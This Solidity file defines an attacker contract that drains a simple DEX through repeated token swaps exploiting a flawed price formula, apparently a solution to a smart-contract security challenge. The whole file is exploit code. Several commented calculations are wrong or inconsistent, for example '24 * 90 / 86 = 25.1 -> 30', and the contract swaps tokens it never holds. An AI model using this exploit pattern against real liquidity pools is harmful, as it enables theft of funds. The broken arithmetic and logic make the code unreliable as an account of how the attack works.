// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract SimpleDexAttacker {
    IDex public dex;
    
    constructor(address _dex) {
        dex = IDex(_dex);
    }
    
    function checkTokens() external view returns (address, address) {
        return (dex.token1(), dex.token2());
    }
    
    function performAttack() external {
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        require(token1 != address(0), "Token1 not set");
        require(token2 != address(0), "Token2 not set");
        
        // Approve the DEX to spend our tokens
        dex.approve(address(dex), type(uint256).max);
        
        // The attack sequence to drain the DEX
        // Due to the price calculation flaw, we can manipulate the exchange rate
        
        // Initial: Player has 10 of each token, DEX has 100 of each
        // Swap 10 token1 -> get 10 token2 (DEX: 110 token1, 90 token2)
        dex.swap(token1, token2, 10);
        
        // Swap 20 token2 -> get 24 token1 (20 * 110 / 90 = 24.4 -> 24)
        dex.swap(token2, token1, 20);
        
        // Swap 24 token1 -> get 30 token2 (24 * 90 / 86 = 25.1 -> 30) 
        dex.swap(token1, token2, 24);
        
        // Swap 30 token2 -> get 41 token1 (30 * 86 / 60 = 43 -> 41)
        dex.swap(token2, token1, 30);
        
        // Swap 41 token1 -> get 65 token2 (41 * 60 / 45 = 54.6 -> 65)
        // But we can only get 45 since that's all the DEX has
        dex.swap(token1, token2, 41);
        
        // At this point, one of the tokens should be drained from the DEX
    }
}